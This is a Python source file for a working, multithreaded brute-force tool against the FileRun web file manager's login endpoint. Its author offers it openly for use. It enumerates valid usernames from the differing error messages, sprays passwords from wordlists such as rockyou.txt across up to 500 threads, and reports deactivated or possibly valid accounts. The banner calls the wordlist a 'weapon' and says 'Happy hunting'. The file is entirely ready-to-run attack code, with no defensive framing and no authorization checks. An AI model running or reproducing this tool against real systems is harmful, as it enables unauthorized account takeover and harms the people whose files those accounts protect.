#!/usr/bin/env python3
"""
FileRun Brute Forcer
--------------------------------------------
- Supports username or password brute-force
- Multithreaded, with resume and range select
- Response-based detection:
    * Invalid username
    * Invalid password
    * Account deactivated
    * Possible valid login
- Verbose (-v) or Silent (-s) mode
--------------------------------------------
Author: mzrismuarf
GitHub: https://github.com/mzrismuarf
License: MIT
"""

import sys
import os
import json
import argparse
import threading
import time
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from urllib.parse import urljoin
import requests
from termcolor import colored
from itertools import cycle

thread_local = threading.local()

def show_banner():
    banner = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣶⣶⣶⣶⣶⣦⣀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⢤⣠⣶⣿⣿⡿⠿⠛⠛⠛⠛⠉⠛⠛⠛⠛⠿⣷⡦⠞⣩⣶⣸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣾⡤⣌⠙⠻⣅⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⢀⣾⣿⣿⠃⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⡟⢇⢻⣧⠄⠀⠈⢓⡢⠴⠒⠒⠒⠒⡲⠚⠁⠀⠐⣪⣿⣿⡿⡄⣿⣷⡄⠀⠀⠀⠀⠀    [ FileRun Brute Force ]
⠀⠀⠀⣠⣿⣿⠟⠁⠸⡼⣿⡂⠀⠀⠈⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠹⣿⣧⢳⡏⠹⣷⡄⠀⠀⠀⠀    Analyzing the target. Preparing the payload. 
⠀⠀⣰⣿⡿⠃⠀⠀⠀⢧⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠇⡸⠀⠀⠘⢿⣦⣄⠀⠀    Remember: the wordlist is your primary weapon. Happy hunting :)
⠀⢰⣿⣿⠃⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠀⠀⠀⠀⠀⠀⠰⡇⠀⠀⠀⠈⣿⣿⣆⠀    ------------------------
⠀⣿⣿⡇⠀⠀⠀⠀⢰⠇⠀⢺⡇⣄⠀⠀⠀⠀⣤⣶⣀⣿⠃⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠸⣿⣿⡀    github.com/mzrismuarf
⢸⣿⣿⠀⠀⠀⠀⠀⢽⠀⢀⡈⠉⢁⣀⣀⠀⠀⠀⠉⣉⠁⠀⠀⠀⣀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⡇
⢸⣿⡟⠀⠀⠀⠠⠀⠈⢧⡀⠀⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠠⢀⠀⠀⠀⠀⠀⢼⠁⠀⠀⠀⠀⠀⢹⣿⡇
⢸⣿⣿⠀⠀⠀⠀⠀⠠⠀⠙⢦⣀⠠⠊⠉⠂⠄⠀⠀⠀⠈⠀⠀⠀⣀⣤⣤⡾⠘⡆⠀⠀⠀⠀⠀⣾⣿⡇
⠘⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢠⠜⠳⣤⡀⠀⠀⣀⣤⡤⣶⣾⣿⣿⣿⠟⠁⠀⠀⡸⢦⣄⠀⠀⢀⣿⣿⠇
⠀⢿⣿⣧⠀⠀⠀⠀⠀⣠⣤⠞⠀⠀⠀⠙⠁⠙⠉⠀⠀⠸⣛⡿⠉⠀⠀⠀⢀⡜⠀⠀⠈⠙⠢⣼⣿⡿⠀
⠀⠈⣿⣿⣆⠀⠀⢰⠋⠡⡇⠀⡀⣀⣤⢢⣤⣤⣀⠀⠀⣾⠟⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⣰⣿⣿⠁⠀
⠀⠀⠈⢿⣿⣧⣀⡇⠀⡖⠁⢠⣿⣿⢣⠛⣿⣿⣿⣷⠞⠁⠀⠀⠈⠫⡉⠁⠀⠀⠀⠀⢀⣼⣿⠿⠃⠀⠀
⠀⠀⠀⠈⠻⣿⣿⣇⡀⡇⠀⢸⣿⡟⣾⣿⣿⣿⣿⠋⠀⠀⠀⢀⡠⠊⠁⠀⠀⠀⢀⣠⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⣀⢸⣿⢻⠛⣿⣿⡿⠁⠀⠀⣀⠔⠉⠀⠀⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣼⣿⣿⣟⠀⠀⡠⠊⠀⣀⣀⣠⣴⣶⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⣿⣿⣿⣿⣶⣶⣷⣶⣶⡿⠿⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(colored(banner, "green"))



# === Spinner for silent mode ===
def spinner(stop_event, counter, total):
    spin = cycle(["|", "/", "-", "\\"])
    while not stop_event.is_set():
        done = counter['attempts']
        sys.stdout.write(f"\r[*] Brute-forcing {next(spin)} [{done}/{total}]")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()


def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
    return thread_local.session


def attempt_login(host_url, user, pwd, line_no, timeout,
                  mode, verbose, silent, print_lock,
                  found_event, result_container, counter_lock, counter):
    """Perform one brute-force attempt and classify response"""
    if found_event.is_set():
        return False

    session = get_session()
    payload = {
        'username': user,
        'password': pwd,
        'otp': '',
        'two_step_secret': '',
        'language': ''
    }

    try:
        resp = session.post(host_url, data=payload, timeout=timeout)
        text = resp.text.strip()
        text_lower = text.lower()
    except Exception as e:
        with print_lock:
            if verbose:
                print(colored(f"[x] Request failed on {user}:{pwd} -> {e}", "red"))
        with counter_lock:
            counter['attempts'] += 1
        return False

    with counter_lock:
        counter['attempts'] += 1
        attempt = counter['attempts']

    # classify
    msg = None
    color = None

    if '"error":"invalid username."' in text_lower:
        if verbose:
            msg = f"[!] {user}:{pwd} [invalid username] [line: {line_no}] (attempt {attempt})"
            color = "red"
    elif '"error":"invalid password."' in text_lower:
        if mode == "username":
            msg = f"[+] VALID USERNAME FOUND: {user} [line: {line_no}]"
            color = "cyan"
            result_container.setdefault('valid_users', []).append(user)
        elif verbose:
            msg = f"[!] {user}:{pwd} [invalid password] [line: {line_no}] (attempt {attempt})"
            color = "red"
    elif "account has been deactivated" in text_lower:
        msg = f"[!] ACCOUNT DEACTIVATED: {user}:{pwd} [line: {line_no}]"
        color = "yellow"
        result_container['deactivated'] = (user, pwd, text)
        found_event.set()
    else:
        msg = f"[+] POSSIBLE VALID LOGIN: {user}:{pwd} [line: {line_no}]"
        color = "green"
        result_container['cred'] = (user, pwd, line_no, text)
        found_event.set()

    # output control
    if msg:
        with print_lock:
            if not silent or any(x in msg for x in ["VALID USERNAME", "ACCOUNT DEACTIVATED", "POSSIBLE VALID LOGIN"]):
                print(colored(msg, color))
                if verbose and "Response" not in msg:
                    print(colored(f"    Response: {text[:150]}...", "yellow"))

    return True


def combos_generator(users, pwds, start_line):
    for idx, pwd in enumerate(pwds):
        line = start_line + idx
        for u in users:
            yield (u, pwd, line)


def prompt_range(total, label):
    print(colored(f"[!] {label} wordlist contains {total} lines", "yellow"))
    s = input(colored("[?] Enter custom range (y=all, e.g. 1-200): ", "cyan")).strip()
    if not s or s.lower() in ("y", "yes"):
        return 1, total
    if "-" in s:
        try:
            a, b = [int(x) for x in s.split("-", 1)]
            a = max(1, a)
            b = min(total, b)
            if a > b:
                a, b = b, a
            return a, b
        except:
            return 1, total
    try:
        val = int(s)
        return 1, min(total, val)
    except:
        return 1, total


def main():
    parser = argparse.ArgumentParser(description="FileRun Brute Forcer v5")
    parser.add_argument("-u", "--host", help="Target host (e.g. http://10.1.2.10)")
    parser.add_argument("-l", "--username", help="Single username")
    parser.add_argument("-L", "--username-list", help="Username list file")
    parser.add_argument("-p", "--password", help="Single password")
    parser.add_argument("-P", "--password-list", help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-s", "--silent", action="store_true", help="Silent mode with spinner")
    args = parser.parse_args()

    # if no args
    if len(sys.argv) == 1:
        print(colored("-------------------------", "green"))
        print("Usage Examples:")
        print("  python3 run.py -u http://target.com/ -l admin -P /usr/share/wordlists/rockyou.txt -t 100")
        print("  python3 run.py -u http://target.com/ -L usernames.txt -p 123 -t 100\n")
        sys.exit(0)

    # determine mode
    if args.username_list and args.password:
        mode = "username"
    elif args.username and args.password_list:
        mode = "password"
    elif args.username_list and args.password_list:
        mode = "combo"
    else:
        print(colored("[x] Invalid combination of parameters.", "red"))
        sys.exit(1)

    threads = max(1, min(args.threads, 500))
    timeout = args.timeout
    verbose = args.verbose
    silent = args.silent

    # load usernames
    if args.username:
        usernames = [args.username.strip()]
    elif args.username_list:
        with open(args.username_list, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
        start, end = prompt_range(len(lines), "Username")
        usernames = lines[start - 1:end]
    else:
        usernames = []

    # load passwords
    if args.password:
        passwords = [args.password.strip()]
    elif args.password_list:
        with open(args.password_list, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
        start, end = prompt_range(len(lines), "Password")
        passwords = lines[start - 1:end]
    else:
        passwords = []

    total_attempts = len(usernames) * len(passwords)
    host_url = urljoin(args.host.rstrip('/') + '/', '?module=fileman&page=login&action=login')
    print(colored(f"[*] Starting brute-force ({len(usernames)} users × {len(passwords)} passwords = {total_attempts}, {threads} threads)", "yellow"))

    print_lock = threading.Lock()
    counter_lock = threading.Lock()
    counter = {'attempts': 0}
    found_event = threading.Event()
    result_container = {}

    spinner_stop = threading.Event()
    if silent:
        spin_thread = threading.Thread(target=spinner, args=(spinner_stop, counter, total_attempts))
        spin_thread.start()

    combos = combos_generator(usernames, passwords, 1)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = set()
        for _ in range(min(threads, total_attempts)):
            try:
                u, p, ln = next(combos)
                fut = executor.submit(attempt_login, host_url, u, p, ln, timeout,
                                      mode, verbose, silent, print_lock,
                                      found_event, result_container, counter_lock, counter)
                futures.add(fut)
            except StopIteration:
                break

        try:
            while futures and not found_event.is_set():
                done, futures = wait(futures, return_when=FIRST_COMPLETED)
                for fut in done:
                    fut.result()
                    if not found_event.is_set():
                        try:
                            u, p, ln = next(combos)
                            newf = executor.submit(attempt_login, host_url, u, p, ln, timeout,
                                                   mode, verbose, silent, print_lock,
                                                   found_event, result_container, counter_lock, counter)
                            futures.add(newf)
                        except StopIteration:
                            pass
        except KeyboardInterrupt:
            print(colored("\n[!] Interrupted by user. Exiting...", "yellow"))
            found_event.set()

    if silent:
        spinner_stop.set()
        spin_thread.join()

    print()

    # summary
    if "deactivated" in result_container:
        u, p, _ = result_container["deactivated"]
        print(colored(f"[!] Account deactivated: {u}:{p}", "yellow"))
        print(colored("    Suggestion: use a different username.\n", "yellow"))
    elif mode == "username":
        valids = result_container.get("valid_users", [])
        if valids:
            print(colored(f"[+] USERNAME FOUND ({len(valids)}):", "cyan"))
            for v in valids:
                print(colored(f"    {v}", "cyan"))
        else:
            print(colored("[~] No valid usernames found.", "yellow"))
    elif "cred" in result_container:
        u, p, ln, res = result_container["cred"]
        print(colored(f"[+] POSSIBLE VALID LOGIN: {u}:{p} [line: {ln}]", "green"))
        print(colored(f"[~] Response: {res[:300]}...", "yellow"))
    else:
        print(colored("[~] Brute-force completed. No valid results.", "yellow"))


if __name__ == "__main__":
    show_banner()
    main()
